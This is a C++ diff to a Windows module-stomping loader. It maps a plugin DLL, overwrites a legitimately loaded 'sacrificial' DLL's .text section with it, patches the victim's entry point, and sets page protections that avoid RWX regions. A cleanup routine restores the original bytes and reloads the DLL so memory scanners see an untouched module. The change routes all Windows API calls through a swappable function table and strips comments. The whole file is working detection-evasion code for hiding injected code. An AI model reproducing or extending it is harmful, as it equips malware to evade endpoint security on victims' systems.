@@ -51,8 +51,6 @@ static DWORD SectionCharsToProtection(DWORD ch) {
     return PAGE_READONLY;
 }
 
-// Resolve an export name from the private mapping, return its address in the
-// stomped module. Must be called BEFORE FreePrivateMapping().
 static void* GetStompedExport(const StompedModule& mod, const char* name) {
     if (!mod.privateBase) return nullptr;
     void* privateAddr = GetExport(MemModule(mod.privateBase), name);
@@ -61,11 +59,11 @@ static void* GetStompedExport(const StompedModule& mod, const char* name) {
     return (void*)((uintptr_t)mod.stompedBase + rva);
 }
 
-// Release the private VirtualAlloc mapping (the floating PE artifact).
-static void FreePrivateMapping(StompedModule& mod) {
+static void FreePrivateMapping(StompedModule& mod,
+                               const WinApiTable& api = DefaultWinApiTable()) {
     if (mod.privateBase) {
         SDBG("Freeing private mapping at %p", mod.privateBase);
-        VirtualFree(mod.privateBase, 0, MEM_RELEASE);
+        api.VirtualFree(mod.privateBase, 0, MEM_RELEASE);
         mod.privateBase = nullptr;
     }
 }
@@ -75,11 +73,12 @@ static void FreePrivateMapping(StompedModule& mod) {
 // image, apply per-section protections (never RWX), and patch the entry point.
 // ---------------------------------------------------------------------------
 static StompedModule StompModule(const uint8_t* pluginDll, size_t pluginSize,
-                                 const char* sacrificialDllName) {
+                                 const char* sacrificialDllName,
+                                 const WinApiTable& api = DefaultWinApiTable()) {
     StompedModule out;
 
     SDBG("MapImage (plugin, %zu bytes)", pluginSize);
-    MemModule priv = MapImage(pluginDll, pluginSize);
+    MemModule priv = MapImage(pluginDll, pluginSize, api);
     if (!priv.base) { SDBG("MapImage failed"); return out; }
 
     auto privDos = (PIMAGE_DOS_HEADER)priv.base;
@@ -87,19 +86,19 @@ static StompedModule StompModule(const uint8_t* pluginDll, size_t pluginSize,
     SIZE_T pluginImageSize = privNt->OptionalHeader.SizeOfImage;
 
     SDBG("LoadLibraryA(\"%s\")", sacrificialDllName);
-    HMODULE hVictim = LoadLibraryA(sacrificialDllName);
+    HMODULE hVictim = api.LoadLibraryA(sacrificialDllName);
     if (!hVictim) {
         SDBG("LoadLibraryA failed (error %lu)", GetLastError());
-        VirtualFree(priv.base, 0, MEM_RELEASE);
+        api.VirtualFree(priv.base, 0, MEM_RELEASE);
         return out;
     }
 
-    GetModuleFileNameA(hVictim, out.sacrificialPath, MAX_PATH);
+    api.GetModuleFileNameA(hVictim, out.sacrificialPath, MAX_PATH);
 
     auto victimText = FindSection(hVictim, ".text");
     if (!victimText) {
         SDBG("No .text section in sacrificial");
-        FreeLibrary(hVictim); VirtualFree(priv.base, 0, MEM_RELEASE);
+        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
         return out;
     }
 
@@ -109,36 +108,34 @@ static StompedModule StompModule(const uint8_t* pluginDll, size_t pluginSize,
 
     if (pluginImageSize > victimTextSize) {
         SDBG("Plugin image larger than victim .text");
-        FreeLibrary(hVictim); VirtualFree(priv.base, 0, MEM_RELEASE);
+        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
         return out;
     }
 
     uint8_t* victimBase = (uint8_t*)hVictim;
     uint8_t* stompAddr  = victimBase + victimText->VirtualAddress;
 
-    // Save original .text and set to RW (never RWX).
-    out.originalBytes = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, victimTextSize);
+    out.originalBytes = (uint8_t*)api.HeapAlloc(api.GetProcessHeap(), 0, victimTextSize);
     if (!out.originalBytes) {
-        FreeLibrary(hVictim); VirtualFree(priv.base, 0, MEM_RELEASE);
+        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
         return out;
     }
 
     MEMORY_BASIC_INFORMATION mbi;
-    VirtualQuery(stompAddr, &mbi, sizeof(mbi));
+    api.VirtualQuery(stompAddr, &mbi, sizeof(mbi));
     out.originalProt = mbi.Protect;
     out.originalSize = victimTextSize;
 
     DWORD oldProt;
-    if (!VirtualProtect(stompAddr, victimTextSize, PAGE_READWRITE, &oldProt)) {
-        HeapFree(GetProcessHeap(), 0, out.originalBytes);
+    if (!api.VirtualProtect(stompAddr, victimTextSize, PAGE_READWRITE, &oldProt)) {
+        api.HeapFree(api.GetProcessHeap(), 0, out.originalBytes);
         out.originalBytes = nullptr;
-        FreeLibrary(hVictim); VirtualFree(priv.base, 0, MEM_RELEASE);
+        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
         return out;
     }
 
     memcpy(out.originalBytes, stompAddr, victimTextSize);
 
-    // Zero, copy the contiguous plugin image, and relocate.
     memset(stompAddr, 0, victimTextSize);
     memcpy(stompAddr, priv.base, pluginImageSize);
 
@@ -168,24 +165,21 @@ static StompedModule StompModule(const uint8_t* pluginDll, size_t pluginSize,
         }
     }
 
-    // Patch victim entry point to `mov eax,1; ret` so FreeLibrary's
-    // DllMain(DETACH) doesn't crash when running stomped code.
     auto victimNt = (PIMAGE_NT_HEADERS)(victimBase + ((PIMAGE_DOS_HEADER)victimBase)->e_lfanew);
     DWORD epRva = victimNt->OptionalHeader.AddressOfEntryPoint;
     if (epRva) {
         uint8_t* epAddr  = victimBase + epRva;
         bool epInText = (epAddr >= stompAddr && epAddr < stompAddr + victimTextSize);
-        if (!epInText) { DWORD tmp; VirtualProtect(epAddr, 16, PAGE_READWRITE, &tmp); }
+        if (!epInText) { DWORD tmp; api.VirtualProtect(epAddr, 16, PAGE_READWRITE, &tmp); }
         epAddr[0] = 0xB8; epAddr[1] = 0x01; epAddr[2] = 0x00;
         epAddr[3] = 0x00; epAddr[4] = 0x00; epAddr[5] = 0xC3;
-        if (!epInText) { DWORD tmp; VirtualProtect(epAddr, 16, PAGE_EXECUTE_READ, &tmp); }
+        if (!epInText) { DWORD tmp; api.VirtualProtect(epAddr, 16, PAGE_EXECUTE_READ, &tmp); }
     }
 
-    // Per-section protections — no RWX regions.
     auto firstSec = IMAGE_FIRST_SECTION(privNt);
     if (firstSec->VirtualAddress > 0) {
         DWORD tmp;
-        VirtualProtect(stompAddr, firstSec->VirtualAddress, PAGE_READONLY, &tmp);
+        api.VirtualProtect(stompAddr, firstSec->VirtualAddress, PAGE_READONLY, &tmp);
     }
 
     auto pluginSec = IMAGE_FIRST_SECTION(privNt);
@@ -194,29 +188,27 @@ static StompedModule StompModule(const uint8_t* pluginDll, size_t pluginSize,
                        ? pluginSec->Misc.VirtualSize : pluginSec->SizeOfRawData;
         if (secSize == 0) continue;
         DWORD tmp;
-        VirtualProtect(stompAddr + pluginSec->VirtualAddress, secSize,
+        api.VirtualProtect(stompAddr + pluginSec->VirtualAddress, secSize,
                        SectionCharsToProtection(pluginSec->Characteristics), &tmp);
     }
 
-    // Tail padding (unused space after plugin image) set to R.
     if (pluginImageSize < victimTextSize) {
         uintptr_t tailStart = ((uintptr_t)(stompAddr + pluginImageSize) + 0xFFF) & ~(uintptr_t)0xFFF;
         uintptr_t tailEnd   = (uintptr_t)(stompAddr + victimTextSize);
         if (tailStart < tailEnd) {
             DWORD tmp;
-            VirtualProtect((void*)tailStart, tailEnd - tailStart, PAGE_READONLY, &tmp);
+            api.VirtualProtect((void*)tailStart, tailEnd - tailStart, PAGE_READONLY, &tmp);
         }
     }
 
-    // Ensure entry point page is executable (may have been set R by tail/section logic).
     if (epRva) {
         uint8_t* epAddr = victimBase + epRva;
         MEMORY_BASIC_INFORMATION epMbi;
-        VirtualQuery(epAddr, &epMbi, sizeof(epMbi));
+        api.VirtualQuery(epAddr, &epMbi, sizeof(epMbi));
         if (!(epMbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |
               PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
             DWORD tmp;
-            VirtualProtect(epAddr, 6, PAGE_EXECUTE_READ, &tmp);
+            api.VirtualProtect(epAddr, 6, PAGE_EXECUTE_READ, &tmp);
         }
     }
 
@@ -228,31 +220,28 @@ static StompedModule StompModule(const uint8_t* pluginDll, size_t pluginSize,
 
 // ---------------------------------------------------------------------------
 // Full cleanup: restore original bytes, unload the stomped module, reload it
-// clean from disk. After this the sacrificial DLL has pristine file-backed
-// pages — memory scanners see an untouched module.
+// clean from disk.
 // ---------------------------------------------------------------------------
-static void FreeStompedModule(StompedModule& mod) {
-    // Restore original .text so DllMain(DETACH) runs the real code.
+static void FreeStompedModule(StompedModule& mod,
+                              const WinApiTable& api = DefaultWinApiTable()) {
     if (mod.stompedBase && mod.originalBytes) {
         DWORD old;
-        VirtualProtect(mod.stompedBase, mod.originalSize, PAGE_READWRITE, &old);
+        api.VirtualProtect(mod.stompedBase, mod.originalSize, PAGE_READWRITE, &old);
         memcpy(mod.stompedBase, mod.originalBytes, mod.originalSize);
-        VirtualProtect(mod.stompedBase, mod.originalSize, mod.originalProt, &old);
+        api.VirtualProtect(mod.stompedBase, mod.originalSize, mod.originalProt, &old);
     }
 
-    // Unload + reload to replace privatised pages with clean file-backed ones.
     if (mod.hSacrificial) {
-        FreeLibrary(mod.hSacrificial);
+        api.FreeLibrary(mod.hSacrificial);
         if (mod.sacrificialPath[0])
-            LoadLibraryA(mod.sacrificialPath);
+            api.LoadLibraryA(mod.sacrificialPath);
     }
 
-    // Scrub saved bytes from heap before freeing.
     if (mod.originalBytes) {
         memset(mod.originalBytes, 0, mod.originalSize);
-        HeapFree(GetProcessHeap(), 0, mod.originalBytes);
+        api.HeapFree(api.GetProcessHeap(), 0, mod.originalBytes);
     }
 
-    FreePrivateMapping(mod);
+    FreePrivateMapping(mod, api);
     mod = StompedModule{};
 }
